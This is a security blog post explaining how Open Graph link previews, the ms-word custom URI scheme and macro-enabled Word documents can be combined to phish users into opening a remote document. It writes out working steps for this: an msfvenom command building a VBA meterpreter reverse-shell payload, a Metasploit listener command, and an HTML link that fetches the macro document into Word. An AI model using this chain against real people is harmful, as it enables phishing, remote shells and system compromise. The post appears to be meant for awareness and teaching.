---
title: Abusing OG Protocol With Macros
date: 2025-03-06 00:00:00 +0200
categories:
  - phishing
tags:
  - phishing
---
**Disclaimer:**

This post is for **educational and informational purposes only**. It is intended to raise awareness about how certain technologies work and should **not** be used for any malicious or unethical activities. Misusing this information may violate laws and terms of service, leading to serious legal consequences. The author **does not** encourage or condone any illegal actions. **Use this knowledge responsibly.**
# Introduction
Hello there! I’m Mohamed Aboelnasr, and in this article, we’ll dive into how adversaries can weaponize the **Open Graph (OG) protocol** and **macros inside Word files** to craft **effective phishing attacks** and achieve initial access. By combining these two techniques, attackers can enhance social engineering tactics and bypass common security measures. 

---
### What Are Macros in Microsoft Word?
Macros in Microsoft Word are **automated sequences of commands** written in **Visual Basic for Applications (VBA)** that perform repetitive tasks. They allow users to automate workflows, but they are also **a common attack vector** exploited by adversaries for malicious purposes.
#### How?
1. **Delivery** – The attacker sends a phishing email with a **Word document attachment** (e.g., "Invoice.docm" or "Urgent_Report.docm").
2. **Social Engineering** – The document tricks the user into **enabling macros** by displaying fake warnings (e.g., "This document is protected, enable macros to view content").
3. **Execution** – Once macros are enabled, the VBA script:
    - **Downloads and executes malware** (like a RAT, ransomware, or keylogger).
    - **Runs PowerShell or CMD commands** to create a backdoor.
    - **Modifies system settings** to establish persistence.
4. **Compromise** – The attacker gains **initial access** to the system, which can lead to full compromise.  

in the following image is how macros are added to a word file 
![Image](https://github.com/user-attachments/assets/46412b21-d2ce-403c-8c94-eb1da48ec446)

There are **auto-execution macros**, meaning they run or executed **automatically** when a Word document is opened, e.g., `AutoOpen()` and `Document_Open()` auto macros.
```vba
Sub AutoOpen()
    Dim str As String
    str = "calc.exe"
    Shell str, vbNormalFocus
End Sub
```

> _For the sake of this demo, we will simply open `calc.exe` to demonstrate how macros work. This harmless example illustrate how attackers can use VBA to execute commands on a victim's machine._

![Image](https://github.com/user-attachments/assets/6a1c995a-decd-4c0e-9138-dea7a882919f)
now anyone opens this document and enables the macros the calculator will open.
![Image](https://github.com/user-attachments/assets/c50cf3c5-5a18-4384-8b35-95bf1931e7d2)

---
### What Are Open Graph (OG):
Open Graph (OG) is a metadata protocol introduced by Facebook that allows web pages to control how their content appears when shared on social media platforms. By using OG meta tags, websites can define the title, description, image, and URL displayed in link previews, making shared links more visually appealing and engaging. While OG is designed for legitimate content sharing, adversaries can manipulate it to craft deceptive previews that enhance phishing and social engineering attacks.
In the following image, you can see how a shared post or link might appear on social media:

![Image](https://github.com/user-attachments/assets/8324182a-2fee-4d35-9a99-ccf9effce8e3)

This preview is controlled by **Open Graph (OG) meta tags** embedded within an HTML file. Below is an example of OG metadata that defines how this link is displayed when shared:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Unveiling Hidden Secrets">
    <meta property="og:description" content="A deep dive into deceptive techniques used in phishing and social engineering attacks.">
    <meta property="og:image" content="https://example.com/dark-secrets.jpg">
    <meta property="og:url" content="https://example.com/phishing-techniques">
    <title>Unveiling Hidden Secrets</title>
</head>
<body>
    <h1>How Attackers Manipulate Open Graph</h1>
    <p>Explore how adversaries exploit OG metadata to craft deceptive link previews.</p>
</body>
</html>
```

These **OG meta tags** tell platforms like **Facebook, Twitter, and LinkedIn** how to display the **title, description, image, and URL** when the page is shared. **Attackers often abuse this to create misleading previews** that look legitimate but lead to malicious websites. 

---
### **How Do Apps Like Zoom or Teams Open from a Browser Click?**
Have you ever clicked a meeting link and suddenly **Zoom, Microsoft Teams, or another app pops up**—seamlessly opening the meeting? This isn't magic; it's made possible by **Custom URI Schemes**.
let's take a step back and talk about a custom URI Scheme
### **What Is a Custom URI Scheme?**
A **Custom URI Scheme** allows installed applications to define their own **protocol handlers**, enabling browsers to interact directly with them. Instead of just opening a webpage, a **custom URL can launch an app** and pass specific instructions.
#### **Examples of Custom URI Schemes :**

- **Zoom:** `zoommtg://zoom.us/join?confno=123456789` → Opens the Zoom app and joins a meeting.
- **Microsoft Teams:** `msteams://teams.microsoft.com/l/meetup-join/...` → Launches Teams and joins a meeting.

#### **How Custom URI Schemes Registered in Windows :**
i created a custom uri for opening the notepad just for demonstration, and it's not hard you just need to register a custom uri in the registry editor as the following
1. Open **Registry Editor** (`regedit`).
2. create a new key name it notepad and Navigate to it and add a new string named 'URL Protocol' with empty value:
    ```
    HKEY_CLASSES_ROOT\notepad
    ```
    
3. Create a **new key** named `shell\open\command`.
4. Set the **default value** of `command` to:
    
    ```
    C:\Windows\System32\notepad.exe
    ```
    ![Image](https://github.com/user-attachments/assets/7bcc1a58-ac09-4fdd-a1f3-217d870b0755)
5. Now, typing `notepad://` in a browser or Run dialog `Win+R` will open Notepad.
![Image](https://github.com/user-attachments/assets/94fa6896-e5a0-42b5-b84b-ae401f39c29d)

---
### **How Attackers Exploit This Mechanism**

While these schemes are designed for convenience, **attackers can take advantage of them** to launch **malicious actions with minimal user interaction**. A well-crafted phishing attack might:
1. **Use Open Graph (OG) manipulation** to create a fake, enticing preview of a "secure document" or "urgent meeting."
2. **Embed a malicious Custom URI link** (e.g., `ms-word:ofe|u|https://attacker.com/malicious.docm`).
3. **When clicked, the link directly opens MS Word, Excel, or another app**, automatically retrieving a remote **macro-enabled** document.
4. **If macros are enabled, the malicious code executes**, leading to initial compromise.

And that is what we are going to do :"

---
first we will generate a vba reverse shell code using msfvenom
```sh
msfvenom -x x64 -p windows/x64/meterpreter/reverse_tcp lport=443 lhost=192.168.1.8 -f vba |xsel --clipboard

```
![Image](https://github.com/user-attachments/assets/c78859c6-2b9d-41bd-a10e-583fd9166066)

and start the listener using the multi/handler module in metasploit
```sh
msfconsole -x "use multi/handler;set lhost 192.168.1.8;set lport 443;set payload windows/x64/meterpreter/reverse_tcp;run"
```
next make a word document file with macros that will contain the shellcode generated from msfvenom
![Image](https://github.com/user-attachments/assets/bb8de95f-ca9a-4a27-83e7-5d9c7fdff329)

After setting up the malicious document, the attacker hosts or embeds it on a website. Now, all they need is for someone to **click the link**, which will open the document **directly in Microsoft Word**. If the victim enables macros, the attack is successful—simple and effective.
![Image](https://github.com/user-attachments/assets/d1cd2f07-ae69-4798-9669-5c4f8b6348d7)
```html
<a href="ms-word:ofe|u|http://192.168.1.8:8080/mymacro.doc"class="btn quote" >
Seek the Truth
</a>
```
- **`ms-word:`** → The **custom URI scheme** registered by Microsoft Word.
- **`ofe|u|`** → Special flags that tell Word how to handle the document:
    - **`ofe`** → Open in **editing mode**.
    - **`u`** → Specifies that the file is located at a URL.
- **`http://192.168.1.8:8080/mymacro.doc`** → The actual **document URL** to be opened.
When this link is executed (e.g., pasted in a browser’s address bar or run via `Win + R`), Microsoft Word will:
1. **Launch Word (if not already open).**
2. **Fetch the document** from the specified URL.
3. **Open it directly** in **editable mode**.
and just by convincing the victim to just visit the site and clicks the button
![Image](https://github.com/user-attachments/assets/db3e6002-d05d-4566-a5bb-b78f1709c11d)
he will be prompted to open Microsoft Word
![Image](https://github.com/user-attachments/assets/55ef5ea1-0924-4410-8ee0-4bc17ded66b8)
the word will start downloading the file and opens it
![Image](https://github.com/user-attachments/assets/6becc8e7-17ba-435a-b91d-604e3d4beb9e)

and if the victim enables editing and macros the malicious code will execute and the attacker will get a reverse shell connection back to his C2 or listener.
![Image](https://github.com/user-attachments/assets/937bd8c5-71f7-498f-89a5-aede10ff4bfc)

And that’s it. I hope no one gets tricked by this. and Remember, this is for educational purposes only— please please do not use it maliciously.  
stay safe people..
 
 ---
### References

- [Microsoft Office URI Schemes](https://learn.microsoft.com/en-us/office/client-developer/office-uri-schemes#13-uri-schema)
- [Open Graph Protocol](https://ogp.me/)
- [What is Open Graph and How Can I Use It?](https://www.freecodecamp.org/news/what-is-open-graph-and-how-can-i-use-it-for-my-website/)